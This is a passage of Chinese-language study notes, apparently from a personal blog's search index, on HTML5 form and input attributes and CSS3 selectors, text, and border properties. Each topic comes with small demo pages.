formenctype=&quot;multipart/form-data&quot;&gt;&lt;!--multipart/form-data：文件上传的类型--&gt;&lt;/form&gt;&lt;!--* formmethod：修改数据提交方法--&gt;&lt;form action=&quot;#&quot; method=&quot;get&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;username&quot;&gt; &lt;input type=&quot;submit&quot; formmethod=&quot;get&quot;&gt;&lt;/form&gt;&lt;!--* form：设置表单元素属于哪个表单--&gt;&lt;form action=&quot;#&quot; method=&quot;get&quot; id=&quot;user-info&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;username&quot;&gt; &lt;input type=&quot;submit&quot;&gt;&lt;/form&gt;&lt;input type=&quot;password&quot; name=&quot;userpwd&quot; form=&quot;user-info&quot;&gt;&lt;!--* novalidate：不验证--&gt;&lt;form action=&quot;#&quot; method=&quot;get&quot; novalidate&gt; &lt;input type=&quot;email&quot; name=&quot;useremail&quot;&gt; &lt;input type=&quot;submit&quot;&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 6.5.3 input属性 autocomplete：规定输入字段是否应该启用自动完成。自动完成允许浏览器预测对字段的输入，当用户在字段开始键入时，浏览器基于之前键入过的值，应该显示出在字段中填写的选项（值：on/off，默认为on）用来帮助用户输入，每一次输入的内容，浏览器是否保存输入的值，以备将来使用为保护敏感数据，如用户账号密码等，避免本地浏览器对他们不安全存储，一般需要关闭 autofocus：规定当前页面加载时，input元素应该自动获得焦点，如果使用该属性，则input元素会获得焦点 step：规定输入字段的合法数字间隔（step=”3”，合法数字应该为-3，0，3，6，9……），一般搭配max/min属性配合使用，以创建合法值得范围 mutiple：多选 pattern：正则匹配 placeholder：输入提示（也可以用label标签包裹） required：必须输入 12345678910111213141516171819202122&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;input属性&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;!--autocomplete：规定输入字段是否应该启用自动完成。--&gt;&lt;form action=&quot;#&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;username&quot; autocomplete=&quot;on&quot;&gt; &lt;input type=&quot;submit&quot;&gt;&lt;/form&gt;&lt;!--autofocus：规定当前页面加载时，input元素应该自动获得焦点--&gt;&lt;form action=&quot;#&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;username&quot; autofocus autocomplete=&quot;on&quot;&gt; &lt;input type=&quot;submit&quot;&gt;&lt;/form&gt;&lt;!--placeholder：输入提示--&gt;&lt;/body&gt;&lt;/html&gt; 6.6 HTML5代码规范 正确使用文档类型请始终在文档首行声明文档类型：&lt;!DOCTYPE html&gt;/&lt;!doctype html&gt; 使用小写元素名，属性名 关闭所有HTML元素 关闭空的HTML元素 属性值引号 双引号 等号后少用空格 图片要加alt属性；定义好图片的尺寸，在加载时可以预留指定空间，减少闪烁 避免长代码 HTML注释 样式表 开括号与选择器在同一行上 在开括号之前用一个空格 使用两个字符的缩进 在每个属性与其值之间使用冒号加一个空格 在每一个逗号或者分号之后使用空格 在每一个属性值对（包括最后一个）之后使用分号 只在值包含空格时使用引号来包围值 把闭括号放在新的一行，之前不用空格 避免每行超过80个字符 6.7 课后实训摘要： 需要引入外部字体link text-shadow: 横向偏移 纵向偏移 模糊度 颜色例如：text-shadow: 1px 1px 1px #fff 删除 &lt;audio&gt;被激活后的边框 1234audio,video,img &#123; border: 0; outline: none;&#125; 加载flash动画和视频，记得给出宽高，因为这样可以有效避免闪烁问题（网速较慢，视频后于文字加载，当视频加载成功，会占据文字位置） 加载flash动画的一种办法 12345&lt;section&gt; &lt;object data=&quot;audio_video/spring.swf&quot; type=&quot;application/x-shockwave-flash&quot; width=&quot;719&quot; height=&quot;428&quot;&gt; &lt;param name=&quot;movie&quot; value=&quot;spring.swf&quot;&gt; &lt;/object&gt;&lt;/section&gt;","categories":[],"tags":[{"name":"HTML","slug":"HTML","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/tags/HTML/"}]},{"title":"CSS新特性","slug":"前端学习10","date":"2021-04-07T13:11:06.000Z","updated":"2021-05-09T12:16:10.967Z","comments":true,"path":"2021/04/07/前端学习10/","link":"","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/2021/04/07/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A010/","excerpt":"","text":"CSS3新特性课程提要 认识CSS3 CSS3选择器 CSS3文本（加阴影） CSS3边框 CSS3背景 CSS3颜色 CSS3渐变 CSS3盒模型 7.1 CSS3简介CSS3是CSS2.1（层叠样式）技术的升级版本，是对CSSS的一个扩展，1999年开始制订，2001年W3C完成CSS3的工作草案，主要包括：列表模块、盒子模型、语言模型、文字特效、背景和边框、文字特效、多栏布局等模块。 CSS3的主要新特性： 选择器 阴影 形状转换（2D转换为3D） 变形 动画（过渡动画、帧动画） 边框 多重背景 反射 文字 颜色函数（不透明度，rgba、hsl、hsla） 滤镜(filter) 弹性布局 多列布局 盒模型 Web字体 媒体查询 CSS3不是所有浏览器或同一浏览器的不同版本都支持，所以需要兼容处理，通常做法：加厂商前缀。 主流浏览器内核（面试点） Trident：IE内核 Webkit：Chrome和Safari内核 Gecko：FireFox内核 Blink（Webkit的分支）：Google/Opera内核 Tips： 目前国内的浏览器大多都是双核的（IE+Chrome内核） Chrome开发速度最快，市场占有率最高 厂商前缀 IE：-ms- Chrome/Safari：-webkit- Firefox：-moz- Opera：-o- (兼容低版本) 7.2 CSS3选择器高级选择器非常有用，可以减少在标签中的class和ID数量，并让设计师更方便地维护样式表。 属性选择 [属性名] [属性名 = 属性值] [属性名 ^= 属性值] [属性名 *= 属性值] [属性名 $= 属性值] 1234567891011121314151617181920212223242526272829303132&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;CSS3选择器&lt;/title&gt; &lt;style&gt; /*属性选择器*/ /* p[class]&#123; color: #8080ff; &#125;*/ /*p[class^=content]&#123;!*class属性值以content开头*!*/ /* color: #8080ff;*/ /*&#125;*/ /*p[class$=content]&#123;!*class属性值以content结尾*!*/ /* color: #8080ff;*/ /*&#125;*/ /*p[class*=p]&#123;!*class属性值以中包含有p*!*/ /* color: #8080ff;*/ /*&#125;*/ &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;div class=&quot;container&quot;&gt; &lt;p class=&quot;content p1&quot;&gt;段落1&lt;/p&gt; &lt;p class=&quot;p2 content&quot;&gt;段落2&lt;/p&gt; &lt;p class=&quot;content&quot;&gt;段落3&lt;/p&gt; &lt;p class=&quot;content&quot;&gt;段落4&lt;/p&gt; &lt;p class=&quot;content p5&quot;&gt;段落5&lt;/p&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 结构性伪类 root：匹配html标签,与body选择器效果一样 first-child：第一个子元素 last-child：最后一个子元素 :nth-last-child(n)：倒数第n个子元素 :nth-child(n)：第n个子元素 :nth-of-type类 :nth-of-type(n) :nth-last-of-type(n) :only-child:父元素中仅有一个子元素,不要去考虑子元素 :only-of-type:父元素中仅有一个该类元素 :empty:没有任何元素，包括文本元素，即查找空元素 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;CSS3选择器&lt;/title&gt; &lt;style&gt; /*结构性伪类*/ /*1.root：匹配html标签,与body选择器效果一样*/ :root&#123; background-color: black; &#125; /*2.子元素选择：匹配父元素中连续的子元素 first-child：第一个子元素 last-child：最后一个子元素 :nth-last-child(n)：倒数第n个子元素 :nth-child(n)：第n个子元素 */ /*p:first-child&#123;*/ /* color: white;*/ /*&#125;*/ /*p:last-child&#123;*/ /* color: red;*/ /*&#125;*/ /*p:nth-child(3)&#123;*/ /* color: deepskyblue;*/ /*&#125;*/ /*p:nth-last-child(2n)&#123;!*2n表示2的倍数：1、2、4、6……或者3n+1：3的倍数加1*!*/ /* color: #8080ff;*/ /*&#125;!*注意：如果p标签不连续，效果可能不好。*!*/ /*3. :nth-of-type类 :nth-of-type(n) :nth-last-of-type(n) */ /*p:nth-of-type(3)&#123;!*找的是p标签中的第三个兄弟标签，如果第3个不是p标签，将跳过，继续向下查询，直到找到为止*!*/ /* color: #8080ff;*/ /*&#125;*/ /*p:nth-child(2)&#123;!*找第三个子元素，如果是p标签，就找到了；如果不是，就没找到，且不再继续查找。*!*/ /* color: white;*/ /*&#125;*/ /*p:nth-last-of-type(2n)&#123;!*找的是p标签中的倒数第四个兄弟标签，如果不是p标签，将跳过，继续向上查询，直到查到为止*!*/ /* color: red;*/ /*&#125;!*注意：其实区别就在于到底在选择时无不无视非p标签,p:nth-child(2n)的结果很重要！！！*!*/ /*4.其他 :only-child:父元素中仅有一个子元素,不要去考虑子元素 :only-of-type:父元素中仅有一个兄弟元素 :empty:没有任何元素，包括文本元素，即查找空元素 */ /*p:only-child&#123;!*查找父元素中只有一个标签，且为p标签的元素，不允许有其他标签存在，但在p标签中，可以有子标签。*!*/ /* width: 200px;*/ /* border: 2px white solid;*/ /* color: cyan;*/ /*&#125;*/ p:only-of-type&#123;/*选择父元素中，p标签是唯一的，可以有其他标签存在*/ width: 200px; border: 2px white solid; color: cyan; &#125; div:empty&#123; width: 200px; height: 100px; background-color: #8080ff; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;div class=&quot;container&quot;&gt; &lt;p class=&quot;content p1&quot;&gt;段落1&lt;/p&gt; &lt;p class=&quot;p2 content&quot;&gt;段落2&lt;/p&gt; &lt;div class=&quot;box&quot;&gt;div-box&lt;/div&gt; &lt;p class=&quot;content&quot;&gt;段落3&lt;/p&gt; &lt;p class=&quot;content&quot;&gt;段落4&lt;/p&gt; &lt;p class=&quot;content p5&quot;&gt;段落5&lt;/p&gt; &lt;div&gt;&lt;p&gt;pppppppp&lt;/p&gt;&lt;/div&gt; &lt;div&gt;&lt;p&gt;pppppppp &lt;span&gt;span&lt;/span&gt;&lt;/p&gt;&lt;/div&gt; &lt;div&gt;&lt;p&gt;pppppppp&lt;/p&gt;&lt;div&gt;div&lt;/div&gt;&lt;/div&gt; &lt;div&gt;&lt;p&gt;pppppppp&lt;/p&gt;&lt;p&gt;div&lt;/p&gt;&lt;/div&gt; &lt;div class=&quot;test&quot;&gt;&lt;/div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 目标伪类 :target：匹配URL指向的元素。 12345678910111213141516171819202122232425262728&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;CSS3选择器&lt;/title&gt; &lt;style&gt; p,div&#123; height: 600px; &#125; /*3.目标伪类 :target：匹配URL指向的元素。 */ p:target&#123; color: deeppink; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;a href=&quot;#jump1&quot;&gt;跳转1&lt;/a&gt;&lt;!--页内跳转--&gt; &lt;a href=&quot;#jump2&quot;&gt;跳转2&lt;/a&gt; &lt;a href=&quot;#jump3&quot;&gt;跳转3&lt;/a&gt; &lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt; &lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt; &lt;p id=&quot;jump1&quot;&gt;这是段落1的内容&lt;/p&gt;&lt;!--这里的ID表示设置了一个锚点，用来实现页内跳转的。--&gt; &lt;div id=&quot;jump2&quot;&gt;这是段落2的内容&lt;/div&gt; &lt;p id=&quot;jump3&quot;&gt;这是段落3的内容&lt;/p&gt;&lt;/body&gt;&lt;/html&gt; UI元素状态伪类 :checked：只在Opera浏览器中有效 :enabled :disabled :selection：设置选中对象颜色 否定伪类 :not() 通用兄弟元素选择器 EF： EF 选择E元素之后的F元素 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;CSS3选择器&lt;/title&gt; &lt;style&gt; /*3.目标伪类 :target：匹配URL指向的元素。 */ /*p,div&#123;*/ /* height: 600px;*/ /*&#125;*/ /*p:target&#123;*/ /* color: deeppink;*/ /*&#125;*/ /*4.UI元素（表单元素）状态伪类*/ input:disabled&#123; background-color: #8080ff; &#125; input:enabled&#123; background-color: lightcoral; color: white; &#125; input:checked&#123;/*只在Opera浏览器中有效*/ color: greenyellow; &#125; ::selection&#123;/*高亮显示被选中文本，注意是双冒号！！！*/ color:salmon; &#125; /*5.否定伪类*/ /*.container :not(p)&#123;!*注意：要有空格！！！！！！！*!*/ /* background-color: black;*/ /* color: white;*/ /*&#125;*/ /*6.通用兄弟元素选择器：E~F 选择E元素之后的F元素*/ .div1 ~ .div2&#123; color: red; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;a href=&quot;#jump1&quot;&gt;跳转1&lt;/a&gt;&lt;!--页内跳转--&gt; &lt;a href=&quot;#jump2&quot;&gt;跳转2&lt;/a&gt; &lt;a href=&quot;#jump3&quot;&gt;跳转3&lt;/a&gt; &lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt; &lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt; &lt;p id=&quot;jump1&quot;&gt;这是段落1的内容&lt;/p&gt;&lt;!--这里的ID表示设置了一个锚点，用来实现页内跳转的。--&gt; &lt;div id=&quot;jump2&quot;&gt;这是段落2的内容&lt;/div&gt; &lt;p id=&quot;jump3&quot;&gt;这是段落3的内容&lt;/p&gt; &lt;form action=&quot;&quot;&gt; &lt;input type=&quot;text&quot; disabled&gt; &lt;br&gt; &lt;input type=&quot;text&quot;&gt; &lt;br&gt; &lt;input type=&quot;text&quot;&gt; &lt;br&gt; &lt;input type=&quot;checkbox&quot; name=&quot;face&quot; checked&gt;党员 &lt;input type=&quot;checkbox&quot; name=&quot;face&quot;&gt;共青团员 &lt;input type=&quot;checkbox&quot; name=&quot;face&quot;&gt;无党派人士 &lt;br&gt; &lt;select&gt; &lt;option&gt;大前端开发&lt;/option&gt; &lt;option selected&gt;大数据开发&lt;/option&gt; &lt;option&gt;UI设计&lt;/option&gt; &lt;/select&gt; &lt;/form&gt; &lt;div class=&quot;container&quot;&gt; &lt;p&gt;p1&lt;/p&gt; &lt;p&gt;p2&lt;/p&gt; &lt;span&gt;span&lt;/span&gt; &lt;em&gt;em&lt;/em&gt; &lt;/div&gt; &lt;div class=&quot;test&quot;&gt; &lt;div class=&quot;div1&quot;&gt;div1&lt;/div&gt; &lt;div class=&quot;div2&quot;&gt;div2&lt;/div&gt; &lt;strong&gt;strong&lt;/strong&gt; &lt;div class=&quot;div3&quot;&gt;&lt;span&gt;div3&lt;/span&gt;&lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/h 7.3 CSS文本7.3.1 文本阴影主流浏览器都支持，不需要去做兼容！ 1text-shadow: h-shadow v-shadow blur spread color inset; 属性值： h-shadow：必须。水平阴影位置。允许负值，指定阴影水平的偏移，即阴影在x轴的位置。值为正数时，阴影在元素右侧；值为负数时，阴影在元素的左侧。 v-shadow：必须。垂直阴影位置。允许负值，指定阴影垂直的偏移，即阴影在y轴的位置。值为正数时，阴影在元素下侧；值为负数时，阴影在元素的上侧。 blur：可选。模糊距离。设置阴影的模糊半径，值为0意味着该阴影是固态而锋利的，完完全全没有模糊效果。blur值越大，阴影则更不锋利而更朦胧/模糊。负值是不合法的，会被自动修正为0。 spread：可选。阴影的尺寸。改变阴影的大小，其值可以是正负值，如果为正，整个阴影都会延展扩大，反之值为负值，则缩小。 color：可选。阴影的颜色。 inset：可选。将外部阴影(outset)改为内部阴影。 123456789101112131415&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;CSS3文本阴影&lt;/title&gt; &lt;style&gt; h1&#123; text-shadow: -2px -3px 5px #8080ff; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&gt;这是文本阴影测试！&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt; 7.3.2 文本自动换行主流浏览器都支持，不需要去做兼容！ 1word-wrap: normal | break-word; 属性值word-wrap允许长单词或者URL换行到下一行。 12345678910111213141516171819202122232425262728293031&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;CSS3文本自动换行&lt;/title&gt; &lt;style&gt; p[id=&quot;1&quot;]&#123; width: 200px; border: 1px black solid; word-wrap: normal; -ms-word-wrap: normal;/*兼容IE*/ &#125; p[id=&quot;2&quot;]&#123; width: 200px; border: 1px black solid; word-wrap: break-word; -ms-word-wrap: break-word;/*兼容IE*/ &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;p id=&quot;1&quot;&gt; AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA. Dancing is a popular pastime to many people all over the world. Way back to past centuries, and even today, tribal people engage in dancing as a form of worship or as a part of a ceremony in a celebration. On such occasions, dancing can be very solemn. In modern times, dancing appeals to different people for different reasons. Young people often include dancing in parties or at other social gatherings. It seems to be an incentive for them to gather. They look forward to dancing into the night during parties without feeling fatigue. To the elderly, the steps in dancing are reduced with a slower tempo in the music. They gather in community centers to learn folk dance and, at the same time, to know one another in such informal interactions. Personally, I doubt the effectiveness of dancing as a major role in keeping one&#x27;s body healthy and in good shape. Activities such as jogging, swimming and playing games are more effective for attaining good health. They can burn off calories in our bodies and develop our muscles. To me, there are more meaningful and effective ways to keep fit. &lt;/p&gt; &lt;p id=&quot;2&quot;&gt; AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA. Dancing is a popular pastime to many people all over the world. Way back to past centuries, and even today, tribal people engage in dancing as a form of worship or as a part of a ceremony in a celebration. On such occasions, dancing can be very solemn. In modern times, dancing appeals to different people for different reasons. Young people often include dancing in parties or at other social gatherings. It seems to be an incentive for them to gather. They look forward to dancing into the night during parties without feeling fatigue. To the elderly, the steps in dancing are reduced with a slower tempo in the music. They gather in community centers to learn folk dance and, at the same time, to know one another in such informal interactions. Personally, I doubt the effectiveness of dancing as a major role in keeping one&#x27;s body healthy and in good shape. Activities such as jogging, swimming and playing games are more effective for attaining good health. They can burn off calories in our bodies and develop our muscles. To me, there are more meaningful and effective ways to keep fit. &lt;/p&gt;&lt;/body&gt;&lt;/html&gt; 7.3.3 单词拆分主流浏览器都支持，不需要去做兼容！ 1word-break: normal|break-all|keep-all; 属性值： normal：使用浏览器默认的换行规则。 break-all：允许在单词内换行。 keep-all：只能在半角空格或连字符处换行。（中英文逗号均无效！） 12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;CSS3单词拆分&lt;/title&gt; &lt;style&gt; p[id=&quot;0&quot;]&#123; width: 200px; border: 1px black solid; &#125; p[id=&quot;1&quot;]&#123; width: 200px; border: 1px black solid; word-break: break-all; &#125; p[id=&quot;2&quot;]&#123; width: 200px; border: 1px black solid; word-break: keep-all; &#125; p[id=&quot;3&quot;]&#123; width: 200px; border: 1px black solid; word-break: normal; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;p id=&quot;0&quot;&gt; AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA. Dancing is a popular pastime to many people all over the world. Way back to past centuries, and even today, tribal people engage in dancing as a form of worship or as a part of a ceremony in a celebration. On such occasions, dancing can be very solemn. In modern times, dancing appeals to different people for different reasons. Young people often include dancing in parties or at other social gatherings. It seems to be an incentive for them to gather. They look forward to dancing into the night during parties without feeling fatigue. To the elderly, the steps in dancing are reduced with a slower tempo in the music. They gather in community centers to learn folk dance and, at the same time, to know one another in such informal interactions. Personally, I doubt the effectiveness of dancing as a major role in keeping one&#x27;s body healthy and in good shape. Activities such as jogging, swimming and playing games are more effective for attaining good health. They can burn off calories in our bodies and develop our muscles. To me, there are more meaningful and effective ways to keep fit.&lt;/p&gt;&lt;p id=&quot;1&quot;&gt; AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA. Dancing is a popular pastime to many people all over the world. Way back to past centuries, and even today, tribal people engage in dancing as a form of worship or as a part of a ceremony in a celebration. On such occasions, dancing can be very solemn. In modern times, dancing appeals to different people for different reasons. Young people often include dancing in parties or at other social gatherings. It seems to be an incentive for them to gather. They look forward to dancing into the night during parties without feeling fatigue. To the elderly, the steps in dancing are reduced with a slower tempo in the music. They gather in community centers to learn folk dance and, at the same time, to know one another in such informal interactions. Personally, I doubt the effectiveness of dancing as a major role in keeping one&#x27;s body healthy and in good shape. Activities such as jogging, swimming and playing games are more effective for attaining good health. They can burn off calories in our bodies and develop our muscles. To me, there are more meaningful and effective ways to keep fit.&lt;/p&gt;&lt;p id=&quot;2&quot;&gt; AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA. Dancing is a popular pastime to many people all over the world. Way back to past centuries, and even today, tribal people engage in dancing as a form of worship or as a part of a ceremony in a celebration. On such occasions, dancing can be very solemn. In modern times, dancing appeals to different people for different reasons. Young people often include dancing in parties or at other social gatherings. It seems to be an incentive for them to gather. They look forward to dancing into the night during parties without feeling fatigue. To the elderly, the steps in dancing are reduced with a slower tempo in the music. They gather in community centers to learn folk dance and, at the same time, to know one another in such informal interactions. Personally, I doubt the effectiveness of dancing as a major role in keeping one&#x27;s body healthy and in good shape. Activities such as jogging, swimming and playing games are more effective for attaining good health. They can burn off calories in our bodies and develop our muscles. To me, there are more meaningful and effective ways to keep fit.&lt;/p&gt;&lt;p id=&quot;3&quot;&gt; AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA. Dancing is a popular pastime to many people all over the world. Way back to past centuries, and even today, tribal people engage in dancing as a form of worship or as a part of a ceremony in a celebration. On such occasions, dancing can be very solemn. In modern times, dancing appeals to different people for different reasons. Young people often include dancing in parties or at other social gatherings. It seems to be an incentive for them to gather. They look forward to dancing into the night during parties without feeling fatigue. To the elderly, the steps in dancing are reduced with a slower tempo in the music. They gather in community centers to learn folk dance and, at the same time, to know one another in such informal interactions. Personally, I doubt the effectiveness of dancing as a major role in keeping one&#x27;s body healthy and in good shape. Activities such as jogging, swimming and playing games are more effective for attaining good health. They can burn off calories in our bodies and develop our muscles. To me, there are more meaningful and effective ways to keep fit.&lt;/p&gt;&lt;/body&gt;&lt;/html&gt; 7.3.4 文本拆分(略)所有主流浏览器都不支持，需要去做兼容！ 1text-wrap: naormal|none|unrestricted|suppress; 属性值： normal：只在允许的换行点进行换行 none：不换行。元素无法容纳的文本会溢出。 unrestricted：在任意两个字符间换行。 suppress：压缩元素中的换行。浏览器只在行中没有其他有效换行点时进行换行。 7.3.5 文本溢出（重要）1text-overflow: clip|ellipsis|string; 属性规定当文本溢出包含元素发生的事情。 属性值： clip：修剪文本。 ellipsis：显示省略号来代表被修剪文本。 string：使用给定的字符串代表被修剪文本。 单行文本溢出1text-overflow: clip|ellipsis|string; 处理文字溢出样式： 12345width: px/%/em/rem;white-space: nowrap; /*不允许折行*/-ms-text-overflow: ellipsis;text-overflow: ellipsis;overflow: hidden; 多行文本溢出（IE9以下版本不支持，主要是谷歌支持）123456div&#123; display: -webkit-box; -webkit-box-orient: vertical; -webkit-line-clamp: 行数; overflow: hidden;&#125; 处理文字溢出样式： 12345width: px/%/em/rem;display: -webkit-box;-webkit-box-orient: vertical;-webkit-line-clamp: 行数;overflow: hidden; 7.4 CSS3边框处理CSS3对网页中的边框进行了一些改进，主要包括：支持圆角边框、多层边框、边框色彩与图片等。在CSS3中，最常用的一个改进就是圆角边框，通过CSS3的属性可以快速实现圆角定义，同时还可以根据实际情况针对特定角进行圆角定义。 7.4.1 圆角边框border-radius：属性是一个简写属性，用于设置四个border-*radius属性。 1border-radius: 1-4 length|% / 1-4 length|%; 注释：按此顺序设置radius的四个值。如果省略bottom-left，则与top-right相同；如果省略top-right，则与top-left相同。 四个方位词： top-left top-right bottom-left bottom-right 属性值： length：定义圆角的形状 %：以百分比定义圆角的形状 注意：想要形成圆形边框，可以使border-radius为1/2长/宽。 ​ 或者使border-radius为50%。 实例1： 1border-radius: 20px; 等价于： 1234border-top-left: 20px;border-top-right: 20px;border-bottom-left: 20px;border-bottom-right: 20px; 实例2： 1border-radius: 20px 30px;/*左上+右下 右上+左下*/ 等价于： 1234border-top-left: 20px;border-top-right: 30px;border-bottom-left: 30px;border-bottom-right: 20px; 实例3： 1border-radius: 20px 30px 40px;/*左上 右上+左下 右下*/ 等价于： 1234border-top-left: 20px;border-top-right: 30px;border-bottom-left: 30px;border-bottom-right: 40px; 实例4： 1border-radius: 20px 30px 40px 50px;/*左上 右上 右下 左下*/ 等价于： 1234border-top-left: 20px;border-top-right: 30px;border-bottom-left: 50px;border-bottom-right: 40px; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;圆角边框&lt;/title&gt; &lt;style&gt; .div1&#123; width: 600px; height: 200px; border: 1px solid violet; margin: 100px auto; -webkit-border-radius: 10px;/*兼容谷歌*/ -moz-border-radius: 10px;/*兼容火狐*/ border-radius: 10px;/*默认*/ &#125; .div2&#123; width: 200px; height: 200px; border: 1px solid violet; margin: 100px auto; -webkit-border-radius: 10%;/*兼容谷歌*/ -moz-border-radius: 10%;/*兼容火狐*/ border-radius: 10%;/*默认*/ &#125; .div3&#123; width: 200px; height: 200px; border: 1px solid violet; margin: 100px auto; -webkit-border-top-left-radius: 50%;/*兼容谷歌*/ -moz-border-radius-topleft: 50%;/*兼容火狐*/ border-top-left-radius: 50%;/*默认*/ &#125; img&#123; width: 528px; height: 326px; margin: 100px auto; display: block; -webkit-border-radius: 0;/*兼容谷歌*/ -moz-border-radius: 0;/*兼容火狐*/ border-radius: 0;/*默认*/ &#125; img:hover&#123;/*选中激活圆角*/ -webkit-border-radius: 50%;/*兼容谷歌*/ -moz-border-radius: 50%;/*兼容火狐*/ border-radius: 50%;/*默认*/ &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=&quot;div1&quot;&gt;&lt;/div&gt; &lt;div class=&quot;div2&quot;&gt;&lt;/div&gt; &lt;div class=&quot;div3&quot;&gt;&lt;/div&gt; &lt;img src=&quot;./imgs/三国杀文姬甄姬.png&quot; alt=&quot;测试&quot;&gt;&lt;/body&gt;&lt;/html&gt; 7.4.2 CSS3边框阴影(IE9以上支持)box-shadow：属性向边框添加一个或多个阴影。 1box-shadow: h-shadow v-shadow blur spread color inset; 注释：box-shadow向边框添加一个或多个阴影，该属性由逗号分隔的阴影列表，每个阴影由2-4个长度值、可选的颜色值以及可选的inset关键词来规定。省略长度为0。 属性值： h-shadow：必须。水平阴影位置。允许负值，指定阴影水平的偏移，即阴影在x轴的位置。值为正数时，阴影在元素右侧；值为负数时，阴影在元素的左侧。 v-shadow：必须。垂直阴影位置。允许负值，指定阴影垂直的偏移，即阴影在y轴的位置。值为正数时，阴影在元素下侧；值为负数时，阴影在元素的上侧。 blur：可选。模糊距离。设置阴影的模糊半径，值为0意味着该阴影是固态而锋利的，完完全全没有模糊效果。blur值越大，阴影则更不锋利而更朦胧/模糊。负值是不合法的，会被自动修正为0。 spread：可选。阴影的尺寸。改变阴影的大小，其值可以是正负值，如果为正，整个阴影都会延展扩大，反之值为负值，则缩小。 color：可选。阴影的颜色。 inset：可选。将外部阴影(outset默认，但是没有outset值！！！)改为内部阴影。 1234567891011121314151617181920&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;CSS3 边框阴影&lt;/title&gt; &lt;style&gt; .div1&#123; width: 200px; height: 200px; background-color: #8080ff; -webkit-box-shadow: 3px 3px 50px 30px deeppink inset; -moz-box-shadow: 3px 3px 50px 30px deeppink inset; box-shadow: 3px 3px 50px 30px deeppink inset; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=&quot;div1&quot;&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 7.4.3 边框图片（IE11.0版本及以上支持）border-image：属性是一个简写属性。用于设置以下属性： border-image-source：图片路径 border-image-slice：图片边框向内偏移 border-image-outset：边框图像区域超出边框的量 border-image-width：图片边框的宽度 border-image-repeat：图片边框是否应平铺(repeat)、铺满(round)或拉伸(stretch) 如果省略，设置其默认值 语法1border-image: source slice width outset repeat 12345678910111213141516171819202122232425262728293031323334353637383940&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;CSS3 边框图片&lt;/title&gt; &lt;style&gt; div,img&#123; width: 300px; height: 150px; border: 10px solid transparent; &#125; .div1&#123; -webkit-border-image: url(./imgs/三国杀文姬甄姬.png) 10 round;/*不要带单位px!!!!!*/ -moz-border-image: url(./imgs/三国杀文姬甄姬.png) 10 round;/*不要带单位px!!!!!*/ -o-border-image: 